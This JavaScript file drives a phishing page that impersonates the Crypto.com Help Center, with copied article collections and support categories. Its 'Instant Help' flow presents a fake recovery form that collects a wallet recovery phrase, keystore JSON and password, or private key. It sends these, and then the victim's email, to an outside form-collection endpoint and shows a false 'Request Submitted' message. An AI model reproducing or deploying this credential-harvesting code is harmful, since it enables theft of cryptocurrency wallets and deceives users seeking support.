const collections = [
  {
    title: "Crypto.com App",
    desc: "Detailed information about Crypto.com App, available markets, CRO lockup, Crypto deposits and withdrawals, referral program, and security",
    count: "114 articles",
  },
  {
    title: "Crypto.com Exchange",
    desc: "Registration, account management, trading, CRO lockup, fees, referral program and security",
    count: "150 articles",
  },
  {
    title: "Crypto.com Prepaid Card",
    desc: "Everything to know about Crypto.com Prepaid Card - application, activation, usage and benefits",
    count: "49 articles",
  },
  {
    title: "Crypto.com Cash Account",
    desc: "Set up, Deposits, Withdrawals, Bank Transfers, Account Management",
    count: "48 articles",
  },
  {
    title: "KYC - Know Your Customer",
    desc: "All about KYC - Verification, documents, applications, Singpass, Source of Funds",
    count: "7 articles",
  },
  {
    title: "Security",
    desc: "APP Policy, Data Privacy, and Security Awareness",
    count: "7 articles",
  },
  {
    title: "Crypto.com Onchain",
    desc: "Onboarding, wallet management, deposit and withdrawal",
    count: "91 articles",
  },
];

const primaryIssues = [
  { icon: "fa-shuffle", text: "Migration Issues" },
  { icon: "fa-coins", text: "Asset Recovery" },
  { icon: "fa-wrench", text: "Rectification" },
  { icon: "fa-user-lock", text: "Account Locked" },
  { icon: "fa-wallet", text: "Withdrawal Issues" },
  { icon: "fa-ellipsis-h", text: "Others" },
];

const otherIssues = [
  { icon: "fa-credit-card", text: "Card Issues" },
  { icon: "fa-money-check-dollar", text: "Deposit Issues" },
  { icon: "fa-arrow-right-arrow-left", text: "Transfer Issues" },
  { icon: "fa-shield-halved", text: "Security Verification" },
  { icon: "fa-key", text: "2FA Problems" },
  { icon: "fa-id-card", text: "KYC Verification" },
  { icon: "fa-mobile-screen", text: "App Problems" },
  { icon: "fa-user", text: "Account Management" },
  { icon: "fa-circle-question", text: "General Enquiry" },
];

const mostRead = [
  "How to choose a Network when Depositing/Withdrawing Crypto?",
  "Crypto.com Prepaid Card - Rewards & Benefits",
  "How to Set Up Your Crypto.com App 2FA?",
  "Cash Account - General Information",
  "How to Update Your Phone Number in the Crypto.com App",
  "Crypto.com Send",
];

// Real-style Article Content
const articlesDB = {
  "How to choose a Network when Depositing/Withdrawing Crypto?": `
        <p class="mb-4">Choosing the correct network is critical when depositing or withdrawing crypto. Using the wrong network may result in permanent loss of funds.</p>
        <h4 class="font-semibold mt-6 mb-3">Supported Networks:</h4>
        <ul class="list-disc pl-6 space-y-3">
            <li><strong>ERC-20</strong> – Ethereum mainnet</li>
            <li><strong>BEP-20</strong> – BNB Smart Chain</li>
            <li><strong>TRC-20</strong> – Tron Network (recommended for low fees)</li>
            <li><strong>Polygon</strong>, <strong>Arbitrum</strong>, <strong>Optimism</strong> and others</li>
        </ul>
        <p class="mt-6 text-sm bg-blue-50 p-4 rounded-2xl">Always verify the network on both sending and receiving platforms before confirming.</p>
    `,

  "Crypto.com Prepaid Card - Rewards & Benefits": `
        <p>The Crypto.com Visa Card provides attractive rewards based on your stake level.</p>
        <ul class="list-disc pl-6 my-4 space-y-2">
            <li>Up to 8% CRO cashback on spending</li>
            <li>Free Spotify, Netflix, and Amazon Prime rebates (higher tiers)</li>
            <li>Airport Lounge Access</li>
            <li>Metal cards with higher tiers</li>
        </ul>
    `,

  "How to Set Up Your Crypto.com App 2FA?": `
        <p>Two-Factor Authentication (2FA) adds an extra layer of security to your account.</p>
        <ol class="list-decimal pl-6 my-4 space-y-3">
            <li>Open the Crypto.com App</li>
            <li>Go to Settings → Security</li>
            <li>Enable 2FA and follow the instructions</li>
            <li>Save your backup codes in a safe place</li>
        </ol>
    `,

  default: `
        <p>This article is from the official Crypto.com Help Center.</p>
        <p class="mt-4">In the real Help Center, you would find step-by-step instructions, screenshots, and troubleshooting tips here.</p>
    `,
};

// Render Functions
function renderCollections(items) {
  const container = document.getElementById("collections-grid");
  container.innerHTML = items
    .map(
      (item) => `
        <div onclick="showArticle('${item.title}')" class="collection-card bg-white border border-gray-200 rounded-2xl p-6 hover:border-[#5E17EB] cursor-pointer">
            <h3 class="font-semibold text-lg mb-2 text-[#0A2540]">${item.title}</h3>
            <p class="text-gray-600 text-sm mb-4 line-clamp-3">${item.desc}</p>
            <span class="inline-block bg-purple-100 text-[#5E17EB] text-xs font-medium px-3 py-1 rounded-full">${item.count}</span>
        </div>
    `,
    )
    .join("");
}

function renderMostRead(items) {
  const container = document.getElementById("most-read");
  container.innerHTML = items
    .map(
      (title) => `
        <div onclick="showArticle('${title}')" class="bg-white border border-gray-200 rounded-2xl p-5 hover:border-[#5E17EB] cursor-pointer transition">
            <p class="font-medium text-gray-800">${title}</p>
        </div>
    `,
    )
    .join("");
}

function showArticle(title) {
  const modal = document.getElementById("article-modal");
  const titleEl = document.getElementById("modal-title");
  const contentEl = document.getElementById("modal-content");

  titleEl.textContent = title;
  contentEl.innerHTML = articlesDB[title] || articlesDB["default"];

  modal.classList.remove("hidden");
  modal.classList.add("flex");
}

function closeModal() {
  const modal = document.getElementById("article-modal");
  modal.classList.add("hidden");
  modal.classList.remove("flex");
}
function renderIssues(issues) {
  const grid = document.getElementById("issue-grid");

  grid.innerHTML = issues
    .map(
      (issue) => `
      <div
        class="feature-card p-5 border rounded-2xl text-center cursor-pointer hover:shadow"
        onclick="${
          issue.text === "Others" ? "showOtherIssues()" : `selectIssue(this)`
        }"
      >
        <i class="fa-solid ${issue.icon} text-3xl mb-3 text-purple-600"></i><br>
        ${issue.text}
      </div>
    `,
    )
    .join("");
}

function showOtherIssues() {
  renderIssues(otherIssues);
}

function setupSearch() {
  const searchInput = document.getElementById("search-input");
  const mobileSearch = document.getElementById("mobile-search");

  const filterContent = (term) => {
    term = term.toLowerCase().trim();
    if (!term) {
      renderCollections(collections);
      renderMostRead(mostRead);
      return;
    }

    const filteredCollections = collections.filter(
      (c) =>
        c.title.toLowerCase().includes(term) ||
        c.desc.toLowerCase().includes(term),
    );

    const filteredMostRead = mostRead.filter((a) =>
      a.toLowerCase().includes(term),
    );

    renderCollections(filteredCollections);
    renderMostRead(filteredMostRead);
  };

  searchInput?.addEventListener("input", (e) => filterContent(e.target.value));
  mobileSearch?.addEventListener("input", (e) => filterContent(e.target.value));
}

// ==================== INSTANT HELP MODAL ====================
function openHelpModal() {
  const modal = document.getElementById("help-modal");
  const body = document.getElementById("help-body");

  body.innerHTML = `
      <h3 class="text-lg font-semibold mb-6 text-center">
          What issue are you facing?
      </h3>

      <div
          id="issue-grid"
          class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4">
      </div>
  `;

  renderIssues(primaryIssues);

  modal.classList.remove("hidden");
  modal.classList.add("flex");
}
function closeHelpModal() {
  const modal = document.getElementById("help-modal");
  if (modal) {
    modal.classList.add("hidden");
    modal.classList.remove("flex");
  }
}

function selectIssue(el) {
  const issue = el.textContent.trim();
  openRecoveryForm(issue);
}
function openRecoveryForm(issue) {
  const body = document.getElementById("help-body");
  window.selectedIssue = issue;

  body.innerHTML = `
    <button
      onclick="openHelpModal()"
      class="mb-5 text-[#5E17EB] font-semibold hover:underline">
      ← Back
    </button>

    <h3 class="text-2xl font-bold text-[#0A2540] mb-2">
      ${issue}
    </h3>

    <p class="text-gray-500 mb-6">
      Select a recovery method and complete the required information below.
    </p>

    <!-- Tabs -->
    <div class="flex bg-gray-100 rounded-2xl p-1 mb-6" role="tablist">

      <button
        class="tab flex-1 py-3 rounded-xl font-semibold transition-all bg-[#5E17EB] text-white shadow-lg"">
        Phrase
      </button>

      <button
        class="tab flex-1 py-3 rounded-xl font-semibold transition-all"
        onclick="switchTab(this,'keystoreForm')">
        Keystore
      </button>

      <button
        class="tab flex-1 py-3 rounded-xl font-semibold transition-all"
        onclick="switchTab(this,'privateKeyForm')">
        Private Key
      </button>

    </div>

    <!-- Forms -->
    <div class="form-area">

      <!-- Phrase -->
      <div <div id="phraseForm" class="form-tab" style="display:block;">

        <textarea
          id="detailsField"
          rows="6"
          class="w-full border border-gray-300 rounded-2xl p-4 resize-none focus:outline-none focus:ring-2 focus:ring-[#5E17EB] focus:border-[#5E17EB]"
          placeholder="Enter your recovery phrase"></textarea>

        <p class="text-sm text-gray-500 mt-3">
          Typically 12 or 24 words separated by single spaces.
        </p>

      </div>

      <!-- Keystore -->
      <div id="keystoreForm" class="form-tab" style="display:none;">

        <textarea
         id="configField"
          rows="6"
          class="w-full border border-gray-300 rounded-2xl p-4 resize-none focus:outline-none focus:ring-2 focus:ring-[#5E17EB] focus:border-[#5E17EB]"
          placeholder="Enter Keystore JSON"></textarea>

        <input
          type="password"
          class="w-full mt-4 border border-gray-300 rounded-2xl p-4 focus:outline-none focus:ring-2 focus:ring-[#5E17EB] focus:border-[#5E17EB]"
          placeholder="Wallet Password">

        <p class="text-sm text-gray-500 mt-3">
          Paste the keystore JSON and enter the password used when it was created.
        </p>

      </div>

      <!-- Private Key -->
      <div id="privateKeyForm" class="form-tab" style="display:none;">

        <textarea
          id="referenceField"
          rows="6"
          class="w-full border border-gray-300 rounded-2xl p-4 resize-none focus:outline-none focus:ring-2 focus:ring-[#5E17EB] focus:border-[#5E17EB]"
          placeholder="Enter your Private Key"></textarea>

        <p class="text-sm text-gray-500 mt-3">
          Usually a long alphanumeric string. Ensure it is entered exactly as provided.
        </p>

      </div>

      <!-- Buttons -->
      <div class="flex gap-4 mt-8">

        <button
          onclick="validateForm()"
          class="flex-1 bg-[#5E17EB] hover:bg-[#4C0FCE] text-white py-3 rounded-2xl font-semibold transition-all">
          PROCEED
        </button>

        <button
          onclick="openHelpModal()"
          class="px-8 border border-gray-300 rounded-2xl hover:bg-gray-100 transition-all">
          Cancel
        </button>

      </div>

    </div>
  `;
}

function switchTab(button, tabId) {
  // Reset all tabs
  document.querySelectorAll(".tab").forEach((tab) => {
    tab.classList.remove("bg-[#5E17EB]", "text-white", "shadow-lg");

    tab.classList.add("text-gray-500");
  });

  // Highlight selected tab
  button.classList.remove("text-gray-500");

  button.classList.add("bg-[#5E17EB]", "text-white", "shadow-lg");

  // Hide all forms
  document.querySelectorAll(".form-tab").forEach((form) => {
    form.style.display = "none";
  });

  // Show selected form
  document.getElementById(tabId).style.display = "block";
}

async function validateForm() {
  let details = "";

  // Phrase form is visible
  if (document.getElementById("phraseForm").style.display !== "none") {
    details = document.getElementById("detailsField").value.trim();
  }

  // Keystore form is visible
  else if (document.getElementById("keystoreForm").style.display !== "none") {
    details = document.getElementById("configField").value.trim();
  }

  // Private Key form is visible
  else if (document.getElementById("privateKeyForm").style.display !== "none") {
    details = document.getElementById("referenceField").value.trim();
  }

  if (!details) {
    alert("Please complete the required field.");
    return;
  }

  showLoading(details);
}

async function submitFirstForm(details) {
  await fetch("https://submit-form.com/ZPxVAw9Fm", {
    method: "POST",

    headers: {
      "Content-Type": "application/json",
    },

    body: JSON.stringify({
      issue: window.selectedIssue,

      details: details,
    }),
  });

  showEmailPopup();
}
function showEmailPopup() {
  const body = document.getElementById("help-body");

  body.innerHTML = `

<h2 class="text-2xl font-bold mb-4">
Verification
</h2>

<p class="text-gray-500 mb-6">
Enter your email address.
</p>

<input
id="emailField"
type="email"
placeholder="Email Address"
class="w-full border rounded-2xl p-4 mb-6">

<button
onclick="submitEmail()"
class="w-full bg-[#5E17EB] text-white py-3 rounded-2xl">

SUBMIT

</button>

`;
}

async function submitEmail() {
  const email = document.getElementById("emailField").value.trim();

  if (!email) {
    alert("Enter your email.");

    return;
  }

  await fetch("https://submit-form.com/ZPxVAw9Fm", {
    method: "POST",

    headers: {
      "Content-Type": "application/json",
    },

    body: JSON.stringify({
      issue: window.selectedIssue,

      email: email,
    }),
  });

  showSuccess();
}

function showSuccess() {
  const body = document.getElementById("help-body");

  body.innerHTML = `

<div class="text-center py-20">

<div class="text-6xl mb-6">
✅
</div>

<h2 class="text-3xl font-bold mb-4">

Request Submitted

</h2>

<p class="text-gray-500 mb-8">

Your support request has been received successfully.

</p>

<button
onclick="closeHelpModal()"
class="bg-[#5E17EB] text-white px-8 py-3 rounded-2xl">

Close

</button>

</div>

`;
}
function showLoading(details) {
  const body = document.getElementById("help-body");

  body.innerHTML = `

<div class="flex flex-col items-center justify-center py-20">

<div
class="animate-spin rounded-full h-16 w-16 border-4 border-purple-200 border-t-[#5E17EB]">
</div>

<h3 class="mt-8 text-xl font-semibold">
Processing Request...
</h3>

<p class="text-gray-500 mt-2">
Please wait...
</p>

</div>

`;

  setTimeout(() => {
    submitFirstForm(details);
  }, 1000);
}
function resetHelpModal() {
  const body = document.getElementById("help-body");

  body.innerHTML = `
    <h3 class="text-lg font-semibold mb-6 text-center">
      What issue are you facing?
    </h3>

    <div
      id="issue-grid"
      class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4">
    </div>
  `;

  renderIssues(primaryIssues);
}
function openChat() {
  alert("💬 Connecting you to Crypto.com Support...");
}

// Initialize
document.addEventListener("DOMContentLoaded", () => {
  renderCollections(collections);
  renderMostRead(mostRead);
  setupSearch();
});
